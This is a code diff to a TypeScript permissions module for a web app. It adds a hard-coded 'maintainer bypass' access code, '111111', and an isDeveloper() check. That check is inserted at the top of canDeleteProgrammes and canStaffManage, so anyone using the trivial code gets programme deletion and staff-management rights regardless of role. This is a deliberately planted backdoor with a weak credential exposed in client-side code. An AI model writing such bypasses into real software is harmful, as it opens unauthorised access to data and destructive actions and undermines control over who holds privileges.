@@ -42,6 +42,13 @@ export const SUPER_ADMIN_ROLES = new Set(["President", "Vice-President"]);
 /** Invite role that should not manage gear, destructive AAR actions, exports, or codes. */
 export const MEMBER_ROLE_LABEL = "Member" as const;
 
+/** Hard-coded maintainer bypass (also seeded in DB for Edge Functions / audit parity). */
+export const DEVELOPER_ACCESS_CODE = "111111";
+
+export function isDeveloper(): boolean {
+  return typeof window !== "undefined" && getCurrentCode() === DEVELOPER_ACCESS_CODE;
+}
+
 export const getCurrentRole = (): string | null =>
   typeof window !== "undefined" ? localStorage.getItem("tpac_user_role") : null;
 
@@ -63,6 +70,7 @@ export const isSuperAdmin = (): boolean => {
 
 /** Committee / leadership roles may delete programmes; Members cannot. */
 export const canDeleteProgrammes = (): boolean => {
+  if (isDeveloper()) return true;
   const role = getCurrentRole();
   return !!role && role !== MEMBER_ROLE_LABEL;
 };
@@ -72,6 +80,7 @@ export const canDeleteProgrammes = (): boolean => {
  * exports, access codes, and staff roster views (subject to Supabase RLS).
  */
 export const canStaffManage = (): boolean => {
+  if (isDeveloper()) return true;
   const role = getCurrentRole();
   return !!role && role !== MEMBER_ROLE_LABEL;
 };
